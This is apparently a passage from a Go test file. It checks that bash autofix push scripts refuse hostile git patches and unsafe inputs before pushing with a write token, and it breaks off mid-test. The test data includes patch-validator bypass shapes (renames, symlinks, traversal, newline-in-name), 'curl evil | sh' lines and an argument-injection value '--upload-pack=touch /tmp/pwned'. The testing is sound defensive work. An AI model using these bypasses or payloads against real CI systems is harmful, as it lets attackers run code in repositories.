package scripts_test

import (
	"archive/zip"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// scripts/bazel-autofix-push.sh and scripts/docs-autofix-push.sh run with a
// write token on untrusted patches. These tests feed them real `git diff`
// output (the good case, and every hostile shape the validator exists for)
// and run the full push/comment flow against a local bare repository standing
// in for github.com and a fake gh.

const docsAutofixPushScript = "scripts/docs-autofix-push.sh"

// autofixRepo is a repository with a "main" branch (base) and a PR head
// commit on top of it (head); patches are made against head.
type autofixRepo struct {
	t    *testing.T
	git  string
	dir  string
	base string
	head string
}

func newAutofixRepo(t *testing.T, files map[string]string, pr func(r *autofixRepo)) *autofixRepo {
	t.Helper()
	git := requireHostTool(t, "git")
	requireAutofixBash(t)
	r := &autofixRepo{t: t, git: git, dir: t.TempDir()}
	r.run("init", "-q", "-b", "main")
	r.run("config", "user.name", "t")
	r.run("config", "user.email", "t@example.invalid")
	r.run("config", "core.hooksPath", ".git/hooks")
	for path, body := range files {
		r.write(path, body)
	}
	r.run("add", "-A")
	r.run("commit", "-q", "-m", "base")
	r.base = strings.TrimSpace(r.run("rev-parse", "HEAD"))
	r.head = r.commit("pr", pr)
	return r
}

// newBazelAutofixRepo: the PR edits cmd/bd and adds internal/newpkg; other/
// is a package it does not touch. The root is a Go package (beads.go) with
// non-package paths (docs/, README.md) under it.
func newBazelAutofixRepo(t *testing.T) *autofixRepo {
	return newAutofixRepo(t, map[string]string{
		"BUILD.bazel":                     "# root\n",
		"beads.go":                        "package beads\n",
		"README.md":                       "# beads\n",
		"docs/guide.md":                   "# guide\n",
		"MODULE.bazel":                    "module(name = \"beads\")\n",
		"MODULE.bazel.lock":               "{}\n",
		"go.mod":                          "module example.com/beads\n",
		"cmd/bd/BUILD.bazel":              "go_library(name = \"bd\")\n",
		"cmd/bd/main.go":                  "package main\n",
		"other/BUILD.bazel":               "go_library(name = \"other\")\n",
		"other/other.go":                  "package other\n",
		".github/workflows/ci.yml":        "name: CI\n",
		"scripts/tool.sh":                 "echo hi\n",
		"third_party/patches/BUILD.bazel": "exports_files([])\n",
	}, func(r *autofixRepo) {
		r.write("cmd/bd/main.go", "package main\n\nimport _ \"example.com/beads/internal/newpkg\"\n")
		r.write("internal/newpkg/newpkg.go", "package newpkg\n")
	})
}

func newDocsAutofixRepo(t *testing.T) *autofixRepo {
	return newAutofixRepo(t, map[string]string{
		"docs/CLI_REFERENCE.md":    "# CLI\n",
		"docs/docs.json":           "{}\n",
		"docs/cli-reference/bd.md": "# bd\n",
		"scripts.sh":               "echo hi\n",
		".github/workflows/ci.yml": "name: CI\n",
		"cmd/bd/main.go":           "package main\n",
	}, func(r *autofixRepo) {
		r.write("cmd/bd/main.go", "package main // new flag\n")
	})
}

func (r *autofixRepo) run(args ...string) string {
	r.t.Helper()
	cmd := exec.Command(r.git, args...)
	cmd.Dir = r.dir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "GIT_CONFIG_GLOBAL=/dev/null")
	out, err := cmd.CombinedOutput()
	if err != nil {
		r.t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return string(out)
}

func (r *autofixRepo) write(path, body string) {
	r.t.Helper()
	full := filepath.Join(r.dir, path)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		r.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
		r.t.Fatal(err)
	}
}

// commit records edit as a commit on top of the current HEAD, on branch
// name, and returns its id.
func (r *autofixRepo) commit(name string, edit func(r *autofixRepo)) string {
	return r.commitMsg(name, name, edit)
}

func (r *autofixRepo) commitMsg(name, msg string, edit func(r *autofixRepo)) string {
	r.t.Helper()
	edit(r)
	r.run("add", "-A")
	r.run("commit", "-q", "-m", msg)
	sha := strings.TrimSpace(r.run("rev-parse", "HEAD"))
	r.run("branch", "-f", "autofix-test-"+name, sha)
	return sha
}

// variant commits edit on top of the PR head without moving it.
func (r *autofixRepo) variant(name string, edit func(r *autofixRepo)) string {
	return r.commitOn(r.head, name, name, edit)
}

// commitOn commits edit, with subject msg, on top of parent and returns to
// the PR head.
func (r *autofixRepo) commitOn(parent, name, msg string, edit func(r *autofixRepo)) string {
	r.t.Helper()
	r.run("checkout", "-q", "--detach", parent)
	sha := r.commitMsg(name, msg, edit)
	r.run("checkout", "-q", "--detach", r.head)
	return sha
}

// patch applies edit to a clean PR-head tree, returns the staged diff as a
// patch file and resets the tree.
func (r *autofixRepo) patch(edit func()) string {
	r.t.Helper()
	r.run("checkout", "-q", "--detach", r.head)
	edit()
	r.run("add", "-A")
	diff := r.run("diff", "--cached", "--binary")
	r.run("reset", "-q", "--hard", r.head)
	r.run("clean", "-qfdx")
	return writeRawPatch(r.t, diff)
}

func writeRawPatch(t *testing.T, body string) string {
	t.Helper()
	file := filepath.Join(t.TempDir(), "autofix.patch")
	if err := os.WriteFile(file, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return file
}

// requireAutofixBash skips when bash cannot run the autofix scripts: they run
// on Linux runners and use bash 4 associative arrays, and macOS runners ship
// /bin/bash 3.2.
func requireAutofixBash(t *testing.T) {
	t.Helper()
	requireHostTool(t, "bash")
	if err := exec.Command("bash", "-c", "declare -A probe=()").Run(); err != nil {
		t.Skip("bash lacks associative arrays (bash >= 4 required)")
	}
}

func runAutofixCheck(t *testing.T, script, dir, patch string) (string, error) {
	t.Helper()
	requireAutofixBash(t)
	if !filepath.IsAbs(script) {
		script = filepath.Join(sourceRepoRoot(t), script)
	}
	cmd := exec.Command("bash", script, "--check", patch)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// Hostile patch shapes that do not depend on the allowlist: the reviewer's
// rename/copy/index-mode bypasses, with an allowlisted target (target) and a
// forbidden source (source).
func hostileHeaderPatches(t *testing.T, source, target string) map[string]string {
	return map[string]string{
		// git apply accepts the legacy headers; --numstat then names only the
		// new (allowlisted) path.
		"legacy rename old/new": writeRawPatch(t, "diff --git a/"+source+" b/"+target+"\n"+
			"rename old "+source+"\nrename new "+target+"\n"),
		"rename from/to without similarity": writeRawPatch(t, "diff --git a/"+source+" b/"+target+"\n"+
			"rename from "+source+"\nrename to "+target+"\n"),
		"copy from/to": writeRawPatch(t, "diff --git a/"+source+" b/"+target+"\n"+
			"copy from "+source+"\ncopy to "+target+"\n"),
		"legacy rename with hunk": writeRawPatch(t, "diff --git a/"+source+" b/"+target+"\n"+
			"rename old "+source+"\nrename new "+target+"\n--- a/"+source+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"non-hex index mode": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"index zz..yy 100755\n--- a/"+target+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"index mode 100755": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"index 1234567..89abcde 100755\n--- a/"+target+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"index symlink mode": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"index 1234567..89abcde 120000\n--- a/"+target+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"index line with trailing junk": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"index 1234567..89abcde 100644 x\n--- a/"+target+"\n+++ b/"+target+"\n@@ -1 +1 @@\n-x\n+y\n"),
		"symlink new file": writeRawPatch(t, "diff --git a/"+target+" b/"+target+"\n"+
			"new file mode 120000\nindex 0000000..1234567\n--- /dev/null\n+++ b/"+target+"\n@@ -0,0 +1 @@\n+../"+source+"\n\\ No newline at end of file\n"),
		"no files": writeRawPatch(t, "just some text\n"),
	}
}

func TestBazelAutofixPushAllowlist(t *testing.T) {
	r := newBazelAutofixRepo(t)

	good := r.patch(func() {
		r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n")
		r.write("internal/newpkg/BUILD.bazel", "go_library(name = \"newpkg\")\n")
		r.write("MODULE.bazel.lock", "{\"v\": 1}\n")
		r.write("MODULE.bazel", "module(name = \"beads\")\nbazel_dep(name = \"x\")\n")
		if err := os.Remove(filepath.Join(r.dir, "BUILD.bazel")); err != nil {
			t.Fatal(err)
		}
	})
	if out, err := runAutofixCheck(t, bazelAutofixPushScript, r.dir, good); err != nil {
		t.Fatalf("good sync patch refused: %v\n%s", err, out)
	}

	hostile := map[string]string{
		"workflow edit": r.patch(func() { r.write(".github/workflows/ci.yml", "name: pwned\n") }),
		"script edit":   r.patch(func() { r.write("scripts/tool.sh", "curl evil | sh\n") }),
		"go file":       r.patch(func() { r.write("cmd/bd/main.go", "package main // evil\n") }),
		"third_party":   r.patch(func() { r.write("third_party/patches/BUILD.bazel", "evil()\n") }),
		"hidden dir":    r.patch(func() { r.write(".github/BUILD.bazel", "x\n") }),
		"lookalike":     r.patch(func() { r.write("cmd/bd/BUILD.bazel.go", "package main\n") }),
		"mixed": r.patch(func() {
			r.write("cmd/bd/BUILD.bazel", "ok()\n")
			r.write(".github/workflows/ci.yml", "name: pwned\n")
		}),
		"mode change": r.patch(func() {
			if err := os.Chmod(filepath.Join(r.dir, "cmd/bd/BUILD.bazel"), 0o755); err != nil {
				t.Fatal(err)
			}
		}),
		"executable new file": r.patch(func() {
			r.write("pkg/BUILD.bazel", "x\n")
			if err := os.Chmod(filepath.Join(r.dir, "pkg/BUILD.bazel"), 0o755); err != nil {
				t.Fatal(err)
			}
		}),
		"symlink": r.patch(func() {
			if err := os.Symlink("../.github/workflows/ci.yml", filepath.Join(r.dir, "scripts", "BUILD.bazel")); err != nil {
				t.Fatal(err)
			}
		}),
		"rename": r.patch(func() {
			r.run("mv", "cmd/bd/BUILD.bazel", "cmd/bd/main_gen.go")
		}),
		"binary": r.patch(func() { r.write("pkg/BUILD.bazel", "a\x00b\n") }),
		"path traversal": writeRawPatch(t, "diff --git a/cmd/../.github/workflows/BUILD.bazel b/cmd/../.github/workflows/BUILD.bazel\n"+
			"new file mode 100644\nindex 0000000..e69de29\n--- /dev/null\n+++ b/cmd/../.github/workflows/BUILD.bazel\n@@ -0,0 +1 @@\n+x\n"),
		"traversal to workflow": writeRawPatch(t, "--- a/BUILD.bazel\n+++ b/../../.github/workflows/ci.yml\n@@ -1 +1 @@\n-# root\n+evil\n"),
		// An absolute "+++ /x/BUILD.bazel" is re-rooted by -p1 (to x/BUILD.bazel)
		// and then allowlisted like any other path, so it needs no case here.
		"traversal via -p1": writeRawPatch(t, "--- /dev/null\n+++ /../.github/BUILD.bazel\n@@ -0,0 +1 @@\n+x\n"),
		"header mismatch":   writeRawPatch(t, "diff --git a/BUILD.bazel b/BUILD.bazel\nindex 1..2 100644\n--- a/BUILD.bazel\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-# root\n+evil\n"),
		// A newline inside a name would split a newline-separated numstat
		// into two allowlisted-looking lines.
		"newline in name": writeRawPatch(t, "diff --git \"a/BUILD.bazel\\n1\\t0\\tBUILD.bazel\" \"b/BUILD.bazel\\n1\\t0\\tBUILD.bazel\"\n"+
			"new file mode 100644\nindex 0000000..e69de29\n--- /dev/null\n+++ \"b/BUILD.bazel\\n1\\t0\\tBUILD.bazel\"\n@@ -0,0 +1 @@\n+x\n"),
	}
	for name, patch := range hostileHeaderPatches(t, ".github/workflows/ci.yml", "foo/BUILD.bazel") {
		hostile[name] = patch
	}
	for name, patch := range hostile {
		t.Run(name, func(t *testing.T) {
			out, err := runAutofixCheck(t, bazelAutofixPushScript, r.dir, patch)
			if err == nil || !strings.Contains(out, "REFUSED") {
				body, _ := os.ReadFile(patch)
				t.Errorf("hostile patch accepted (err=%v):\n%s\n--- patch ---\n%s", err, out, body)
			}
		})
	}
}

func TestDocsAutofixPushAllowlist(t *testing.T) {
	r := newDocsAutofixRepo(t)
	good := r.patch(func() {
		r.write("docs/CLI_REFERENCE.md", "# CLI\n\nnew flag\n")
		r.write("docs/cli-reference/bd-new.md", "# new\n")
		r.write("docs/docs.json", "{\"a\": 1}\n")
	})
	if out, err := runAutofixCheck(t, docsAutofixPushScript, r.dir, good); err != nil {
		t.Fatalf("good docs patch refused: %v\n%s", err, out)
	}
	hostile := map[string]string{
		"workflow edit": r.patch(func() { r.write(".github/workflows/ci.yml", "name: pwned\n") }),
		"script edit":   r.patch(func() { r.write("scripts.sh", "curl evil | sh\n") }),
		"nested":        r.patch(func() { r.write("docs/cli-reference/a/b.md", "x\n") }),
		// The reviewer's end-to-end bypass on main: scripts.sh renamed to
		// an allowlisted doc name.
		"rename script to doc": r.patch(func() {
			r.run("mv", "scripts.sh", "docs/cli-reference/x.md")
		}),
		"mode change": r.patch(func() {
			if err := os.Chmod(filepath.Join(r.dir, "docs/docs.json"), 0o755); err != nil {
				t.Fatal(err)
			}
		}),
		"binary": r.patch(func() { r.write("docs/cli-reference/bin.md", "a\x00b\n") }),
	}
	for name, patch := range hostileHeaderPatches(t, "scripts.sh", "docs/cli-reference/x.md") {
		hostile[name] = patch
	}
	for name, patch := range hostile {
		t.Run(name, func(t *testing.T) {
			out, err := runAutofixCheck(t, docsAutofixPushScript, r.dir, patch)
			if err == nil || !strings.Contains(out, "REFUSED") {
				body, _ := os.ReadFile(patch)
				t.Errorf("hostile patch accepted (err=%v):\n%s\n--- patch ---\n%s", err, out, body)
			}
		})
	}
}

// fakeGH writes a gh stand-in that serves canned API responses from env,
// applies --jq like gh does, and logs every call (with comment bodies) to
// $FAKE_GH_LOG. A call whose endpoint contains $FAKE_GH_FAIL fails.
func fakeGH(t *testing.T) string {
	t.Helper()
	requireHostTool(t, "jq")
	bin := t.TempDir()
	script := `#!/usr/bin/env bash
set -euo pipefail
echo "gh $*" >> "$FAKE_GH_LOG"
method=GET jq_expr="" path=""
while [ $# -gt 0 ]; do
  case "$1" in
    api | --paginate) ;;
    --method) method="$2"; shift ;;
    --jq) jq_expr="$2"; shift ;;
    -F | -f)
      case "$2" in body=@*) { echo "--- body"; cat "${2#body=@}"; } >> "$FAKE_GH_LOG" ;; esac
      shift ;;
    *) path="$1" ;;
  esac
  shift
done
if [ -n "${FAKE_GH_FAIL:-}" ] && [[ "$path" == *"$FAKE_GH_FAIL"* ]]; then
  echo "gh: HTTP 500" >&2
  exit 1
fi
out='{}'
case "$method $path" in
  "GET "*"/pulls?state=open"*) out="$FAKE_PULLS" ;;
  "GET "*/commits/*) out="$(jq -n --arg m "${FAKE_HEAD_MSG:-feat: add a file}" '{commit: {message: $m}}')" ;;
  "GET "*/comments) out="${FAKE_COMMENTS:-[]}" ;;
  "GET "*/rules/branches/*) out="${FAKE_RULES:-[]}" ;;
  "GET "*/branches/*) out="${FAKE_BRANCH:-}"; [ -n "$out" ] || out='{"protected": false}' ;;
esac
if [ -n "$jq_expr" ]; then
  printf '%s' "$out" | jq -r "$jq_expr"
else
  printf '%s' "$out"
fi
`
	if err := os.WriteFile(filepath.Join(bin, "gh"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	return bin
}

type autofixFlowResult struct {
	out, log, remote string
	head, branch     string
	err              error
}

type autofixFlow struct {
	script   string // repo-relative, or absolute for a modified copy
	headRepo string
	branch   string
	headSHA  string // PR head (defaults to r.head)
	remoteAt string // where the remote branch points (defaults to headSHA)
	patch    string
	baseRepo string // the PR's base repo in the pulls listing
	pulls    string // open-PR listing (defaults to PR #7 for this head)
	env      []string
}

func (r *autofixRepo) runFlow(t *testing.T, f autofixFlow) autofixFlowResult {
	t.Helper()
	if f.headRepo == "" {
		f.headRepo = "owner/beads"
	}
	if f.branch == "" {
		f.branch = "feature/x"
	}
	if f.headSHA == "" {
		f.headSHA = r.head
	}
	if f.remoteAt == "" {
		f.remoteAt = f.headSHA
	}
	if f.baseRepo == "" {
		f.baseRepo = "owner/beads"
	}
	script := f.script
	if !filepath.IsAbs(script) {
		script = filepath.Join(sourceRepoRoot(t), script)
	}
	github := t.TempDir()
	remote := filepath.Join(github, "owner", "beads.git")
	r.run("clone", "-q", "--bare", r.dir, remote)
	r.run("--git-dir="+remote, "branch", "-f", "main", r.base)
	r.run("--git-dir="+remote, "branch", "-f", f.branch, f.remoteAt)
	gitconfig := filepath.Join(t.TempDir(), "gitconfig")
	if err := os.WriteFile(gitconfig, []byte("[url \"file://"+github+"/\"]\n\tinsteadOf = https://github.com/\n"+
		"[uploadpack]\n\tallowFilter = true\n[protocol \"file\"]\n\tallow = always\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	log := filepath.Join(t.TempDir(), "gh.log")
	pulls := f.pulls
	if pulls == "" {
		pulls = "[" + pullJSON(7, f.branch, f.headSHA, f.headRepo, "main", f.baseRepo) + "]"
	}
	cmd := exec.Command("bash", script)
	cmd.Dir = t.TempDir()
	cmd.Env = append([]string{
		"PATH=" + fakeGH(t) + string(os.PathListSeparator) + os.Getenv("PATH"),
		"HOME=" + t.TempDir(),
		"GIT_CONFIG_GLOBAL=" + gitconfig, "GIT_CONFIG_NOSYSTEM=1",
		"FAKE_GH_LOG=" + log, "FAKE_PULLS=" + pulls,
		"BASE_REPO=owner/beads", "HEAD_REPO=" + f.headRepo, "HEAD_BRANCH=" + f.branch, "HEAD_SHA=" + f.headSHA,
		"PATCH_FILE=" + f.patch, "RUN_ID=42", "RUN_URL=https://github.com/owner/beads/actions/runs/42",
		"GH_TOKEN=api-token", "PUSH_TOKEN=push-token",
	}, f.env...)
	out, err := cmd.CombinedOutput()
	logBody, _ := os.ReadFile(log)
	head := strings.TrimSpace(r.run("--git-dir="+remote, "rev-parse", f.branch))
	return autofixFlowResult{out: string(out), log: string(logBody), remote: remote, head: head, branch: f.branch, err: err}
}

func pullJSON(number int, branch, sha, headRepo, baseRef, baseRepo string) string {
	return fmt.Sprintf(`{"number":%d,"head":{"ref":%q,"sha":%q,"repo":{"full_name":%q}},"base":{"ref":%q,"repo":{"full_name":%q}}}`,
		number, branch, sha, headRepo, baseRef, baseRepo)
}

// scriptWith copies script with each old (which must occur exactly once)
// replaced by its new, so a test can switch one layer off and exercise the
// next one alone.
func scriptWith(t *testing.T, script string, oldNew ...string) string {
	t.Helper()
	body := readPolicyFile(t, sourceRepoRoot(t), script)
	for i := 0; i+1 < len(oldNew); i += 2 {
		if n := strings.Count(body, oldNew[i]); n != 1 {
			t.Fatalf("%s: want exactly one %q, got %d", script, oldNew[i], n)
		}
		body = strings.Replace(body, oldNew[i], oldNew[i+1], 1)
	}
	copyPath := filepath.Join(t.TempDir(), filepath.Base(script))
	if err := os.WriteFile(copyPath, []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
	return copyPath
}

// withoutValidator copies script with its up-front validate_patch call
// disabled, so a flow test exercises the post-apply staged check alone.
func withoutValidator(t *testing.T, script string) string {
	t.Helper()
	return scriptWith(t, script, "\nvalidate_patch \"$PATCH_FILE\"\n", "\n: skipped validate_patch\n")
}

// summaryOnly copies script with the header greps of validate_patch
// switched off, so --check exercises `git apply --summary` (then numstat).
func summaryOnly(t *testing.T, script string) string {
	t.Helper()
	return scriptWith(t, script,
		`if grep -qE '^(old mode|new mode|similarity index|dissimilarity index|rename |copy |GIT binary patch|Binary files )' "$file"; then`, "if false; then",
		`if grep -E '^(new file mode|deleted file mode) ' "$file" | grep -qvE '^(new file mode|deleted file mode) 100644$'; then`, "if false; then",
		`if grep -E '^index ' "$file" | grep -qvE '^index [0-9a-f]+\.\.[0-9a-f]+( 100644)?$'; then`, "if false; then")
}

func TestBazelAutofixPushFlow(t *testing.T) {
	r := newBazelAutofixRepo(t)
	good := r.patch(func() {
		r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n")
		r.write("internal/newpkg/BUILD.bazel", "go_library(name = \"newpkg\")\n")
	})
	flow := func(f autofixFlow) autofixFlow {
		f.script = bazelAutofixPushScript
		if f.patch == "" {
			f.patch = good
		}
		return f
	}
	unchanged := func(t *testing.T, res autofixFlowResult, want string) {
		t.Helper()
		if res.head != r.head {
			t.Errorf("branch moved to %s; want no push\n%s\n%s", res.head, res.out, res.log)
		}
		if want != "" && !strings.Contains(res.log+res.out, want) {
			t.Errorf("want %q in output or comment:\n%s\n%s", want, res.out, res.log)
		}
	}

	t.Run("same-repo PR gets the sync commit", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{}))
		if res.err != nil {
			t.Fatalf("err=%v\n%s\n%s", res.err, res.out, res.log)
		}
		if res.head == r.head {
			t.Fatalf("branch not advanced:\n%s", res.out)
		}
		if parent := strings.TrimSpace(r.run("--git-dir="+res.remote, "rev-parse", res.head+"^")); parent != r.head {
			t.Errorf("pushed commit parent = %s, want the PR head %s", parent, r.head)
		}
		files := r.run("--git-dir="+res.remote, "diff", "--name-only", r.head, res.head)
		if files != "cmd/bd/BUILD.bazel\ninternal/newpkg/BUILD.bazel\n" {
			t.Errorf("pushed commit touches %q", files)
		}
		subject := r.run("--git-dir="+res.remote, "log", "-1", "--format=%s", res.head)
		if !strings.HasPrefix(subject, "build(bazel): auto-sync BUILD files") {
			t.Errorf("subject = %q", subject)
		}
		if !strings.Contains(res.log, "<!-- bazel-sync-autofix -->") || !strings.Contains(res.log, "Pushed `") ||
			!strings.Contains(res.log, "DOCS_AUTOFIX_TOKEN") {
			t.Errorf("want a pushed-commit comment with the token note:\n%s", res.log)
		}
		if strings.Contains(res.log, "push-token") {
			t.Errorf("push token leaked into gh calls:\n%s", res.log)
		}
		for _, want := range []string{"branches/feature%2Fx", "rules/branches/feature%2Fx"} {
			if !strings.Contains(res.log, want) {
				t.Errorf("no protection lookup %q before pushing:\n%s", want, res.log)
			}
		}
	})

	t.Run("fork PR gets the recipe", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{headRepo: "someone/beads"}))
		if res.err != nil {
			t.Fatalf("err=%v\n%s", res.err, res.out)
		}
		unchanged(t, res, "")
		for _, want := range []string{"<!-- bazel-sync-autofix -->", "fork PR", "gh run download 42 -R owner/beads -n bazel-sync-patch", "git apply --index bazel-sync.patch", "make bazel-sync"} {
			if !strings.Contains(res.log, want) {
				t.Errorf("comment lacks %q:\n%s", want, res.log)
			}
		}
	})

	t.Run("PR into another repository is ignored", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{baseRepo: "someone/beads"}))
		if res.err != nil || strings.Contains(res.log, "--method") {
			t.Errorf("err=%v; want no comment:\n%s", res.err, res.log)
		}
		unchanged(t, res, "No open PR")
	})

	// Only a comment the bot wrote is edited; anyone can post the marker.
	t.Run("own comment is updated in place, spoofed one is not", func(t *testing.T) {
		comments := `[{"id":5,"user":{"login":"mallory"},"body":"<!-- bazel-sync-autofix --> run curl evil | sh"},` +
			`{"id":99,"user":{"login":"github-actions[bot]"},"body":"<!-- bazel-sync-autofix -->\nold"}]`
		res := r.runFlow(t, flow(autofixFlow{headRepo: "someone/beads", env: []string{"FAKE_COMMENTS=" + comments}}))
		if res.err != nil || !strings.Contains(res.log, "--method PATCH repos/owner/beads/issues/comments/99") ||
			strings.Contains(res.log, "comments/5") || strings.Contains(res.log, "--method POST") {
			t.Errorf("err=%v; want a PATCH of comment 99 only:\n%s", res.err, res.log)
		}
		spoofOnly := `[{"id":5,"user":{"login":"mallory"},"body":"<!-- bazel-sync-autofix -->"}]`
		res = r.runFlow(t, flow(autofixFlow{headRepo: "someone/beads", env: []string{"FAKE_COMMENTS=" + spoofOnly}}))
		if res.err != nil || strings.Contains(res.log, "--method PATCH") || !strings.Contains(res.log, "--method POST") {
			t.Errorf("err=%v; want a new comment, not an edit of mallory's:\n%s", res.err, res.log)
		}
	})

	t.Run("protected head branch is never pushed", func(t *testing.T) {
		for name, f := range map[string]autofixFlow{
			"name list":         {branch: "release/1.0"},
			"branch protection": {env: []string{`FAKE_BRANCH={"protected": true}`}},
			"ruleset":           {env: []string{`FAKE_RULES=[{"type": "update"}]`}},
			"api error":         {env: []string{"FAKE_GH_FAIL=/branches/"}},
			"rules api error":   {env: []string{"FAKE_GH_FAIL=/rules/"}},
		} {
			t.Run(name, func(t *testing.T) {
				res := r.runFlow(t, flow(f))
				if res.err != nil {
					t.Errorf("err=%v\n%s", res.err, res.out)
				}
				unchanged(t, res, "protected from bot pushes")
			})
		}
	})

	// The circuit breaker reads the head's subject from the fetched commit
	// (no API), fails closed, and only fires once the PR's own fix is known:
	// a bot head whose remaining drift is main's gets the "not this PR" note.
	t.Run("circuit breaker", func(t *testing.T) {
		botHead := r.commitOn(r.head, "bot", "build(bazel): auto-sync BUILD files\n\nApplied from ...", func(r *autofixRepo) {
			r.write("internal/newpkg/newpkg.go", "package newpkg // synced\n")
		})
		mainDrift := writeRawPatch(t, "diff --git a/other/BUILD.bazel b/other/BUILD.bazel\n--- a/other/BUILD.bazel\n+++ b/other/BUILD.bazel\n"+
			"@@ -1 +1 @@\n-go_library(name = \"other\")\n+go_library(name = \"other\", srcs = [\"other.go\"])\n")
		noSubject := scriptWith(t, bazelAutofixPushScript, `HEAD_SUBJECT="$(git_ log -1 --format=%s "$HEAD_SHA")"`, `HEAD_SUBJECT="$(false)"`)
		for name, tc := range map[string]struct {
			f          autofixFlow
			want, deny string
		}{
			"bot head with the PR's own drift": {f: flow(autofixFlow{headSHA: botHead}), want: "previous auto-fix commit did not fix this PR's own files", deny: "files this PR did not change"},
			"bot head with main's drift only":  {f: flow(autofixFlow{headSHA: botHead, patch: mainDrift}), want: "files this PR did not change", deny: "did not fix"},
			"subject unreadable":               {f: autofixFlow{script: noSubject, patch: good}, want: "previous auto-fix commit did not fix", deny: "Pushed `"},
		} {
			t.Run(name, func(t *testing.T) {
				res := r.runFlow(t, tc.f)
				if res.err != nil {
					t.Errorf("err=%v", res.err)
				}
				if res.head != tc.f.headSHA && !(tc.f.headSHA == "" && res.head == r.head) {
					t.Errorf("branch moved to %s; want no push\n%s", res.head, res.out)
				}
				if !strings.Contains(res.log, tc.want) || strings.Contains(res.log, tc.deny) {
					t.Errorf("want a comment with %q and without %q:\n%s\n%s", tc.want, tc.deny, res.out, res.log)
				}
				if strings.Contains(res.log, "/commits/") {
					t.Errorf("head subject read through the API:\n%s", res.log)
				}
			})
		}
	})

	// One head branch can back several open PRs; the artifact's PR number
	// picks among the ones that match the event, and without it the bot does
	// not guess.
	t.Run("PR selection", func(t *testing.T) {
		two := "[" + pullJSON(7, "feature/x", r.head, "someone/beads", "main", "owner/beads") + "," +
			pullJSON(8, "feature/x", r.head, "someone/beads", "release/x", "owner/beads") + "]"
		metaFor := func(pr string) string {
			meta := filepath.Join(t.TempDir(), "bazel-sync-meta.txt")
			if err := os.WriteFile(meta, []byte("pr="+pr+"\nhead_sha="+r.head+"\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			return meta
		}
		for name, tc := range map[string]struct {
			meta, want string
			comment    bool
		}{
			"ambiguous without metadata":    {want: "2 open PRs use someone/beads:feature/x"},
			"metadata picks the second PR":  {meta: "8", want: "issues/8/comments", comment: true},
			"metadata picks the first PR":   {meta: "7", want: "issues/7/comments", comment: true},
			"metadata names no matching PR": {meta: "9", want: "numbered #9"},
		} {
			t.Run(name, func(t *testing.T) {
				f := flow(autofixFlow{headRepo: "someone/beads", pulls: two})
				if tc.meta != "" {
					f.env = []string{"META_FILE=" + metaFor(tc.meta)}
				}
				res := r.runFlow(t, f)
				if res.err != nil || !strings.Contains(res.out+res.log, tc.want) {
					t.Errorf("err=%v; want %q:\n%s\n%s", res.err, tc.want, res.out, res.log)
				}
				if got := strings.Contains(res.log, "--method"); got != tc.comment {
					t.Errorf("commented=%v, want %v:\n%s", got, tc.comment, res.log)
				}
				unchanged(t, res, "")
			})
		}
	})

	// HEAD_SHA reaches git as a revision: anything but a full commit id is
	// refused before the patch, the API or git sees it.
	t.Run("HEAD_SHA must be 40 hex", func(t *testing.T) {
		for _, bad := range []string{"HEAD", r.head[:12], strings.ToUpper(r.head), "--upload-pack=touch /tmp/pwned", r.head + "\n", r.head + "0"} {
			res := r.runFlow(t, flow(autofixFlow{env: []string{"HEAD_SHA=" + bad}}))
			if res.err == nil || !strings.Contains(res.out, "HEAD_SHA is not a commit id") || res.log != "" {
				t.Errorf("HEAD_SHA=%q: err=%v gh log=%q\n%s", bad, res.err, res.log, res.out)
			}
			unchanged(t, res, "")
		}
	})

	t.Run("metadata for another head vetoes", func(t *testing.T) {
		meta := filepath.Join(t.TempDir(), "bazel-sync-meta.txt")
		if err := os.WriteFile(meta, []byte("pr=7\nhead_sha="+strings.Repeat("a", 40)+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		res := r.runFlow(t, flow(autofixFlow{env: []string{"META_FILE=" + meta}}))
		if res.err != nil || res.log != "" {
			t.Errorf("err=%v gh log=%q\n%s", res.err, res.log, res.out)
		}
		unchanged(t, res, "")
	})

	t.Run("hostile patch fails before any API call", func(t *testing.T) {
		evil := r.patch(func() { r.write(".github/workflows/ci.yml", "name: pwned\n") })
		res := r.runFlow(t, flow(autofixFlow{patch: evil}))
		if res.err == nil || res.log != "" || !strings.Contains(res.out, "REFUSED") {
			t.Errorf("err=%v gh log=%q\n%s", res.err, res.log, res.out)
		}
		unchanged(t, res, "")
	})

	// The reviewer's bypasses, with the up-front validator switched off: the
	// post-apply staged check alone still refuses them.
	t.Run("staged check alone refuses renames", func(t *testing.T) {
		noValidator := withoutValidator(t, bazelAutofixPushScript)
		for name, patch := range map[string]string{
			"legacy rename old/new": writeRawPatch(t, "diff --git a/.github/workflows/ci.yml b/internal/newpkg/BUILD.bazel\n"+
				"rename old .github/workflows/ci.yml\nrename new internal/newpkg/BUILD.bazel\n"),
			"rename from/to": writeRawPatch(t, "diff --git a/scripts/tool.sh b/internal/newpkg/BUILD.bazel\n"+
